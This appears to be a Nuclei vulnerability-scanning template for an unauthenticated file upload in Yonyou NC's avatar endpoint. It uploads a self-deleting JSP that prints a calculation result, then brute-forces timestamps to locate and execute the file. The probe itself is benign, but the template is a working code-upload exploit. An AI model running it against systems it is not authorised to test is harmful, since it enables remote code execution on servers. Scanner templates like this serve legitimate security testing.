id: yonyou-nc-avatar-fileupload

info:
  name: yonyou-nc-avatar-fileupload
  author: msk
  severity: critical


variables:
  filename: "{{to_lower(rand_base(10))}}"
  boundary: "{{to_lower(rand_base(20))}}"
  usercode: "{{to_lower(rand_base(4))}}"

flow: |
  
  if(http(1)==true){
      log("存在漏洞开始爆破")
      var dateObject = new Date(template["uploadtime"]);

      startTime = dateObject.getTime()

      for (var i = 0; i < 1000; i++) {

          var currentTime = startTime + i;
          set("currentTime",currentTime)
          if(http(2)===true){
            break
          }
      }
  }
  
http:
  - raw:
      - |
        POST /uapim/upload/avatar?usercode={{usercode}}&fileType=jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
        Content-Type: multipart/form-data; boundary=----{{boundary}}
        Accept-Encoding: gzip

        ------{{boundary}}
        Content-Disposition: form-data; name="uploadedfile"; filename="{{filename}}.jsp"

        <%out.print(111*111);new java.io.File(application.getRealPath(request.getServletPath())).delete();%>
        ------{{boundary}}--


    extractors:
      - type: kval
        part: header
        internal: true
        name: uploadtime
        kval:
          - Date

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && contains((body_1), 'true')"

  - raw:
      - |
        GET /uapim/static/pages/photo/{{usercode}}/{{usercode}}.{{currentTime}}.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0

    matchers:
      - type: dsl
        dsl:
          - "status_code_1 == 200 && contains((body_1), '12321')"
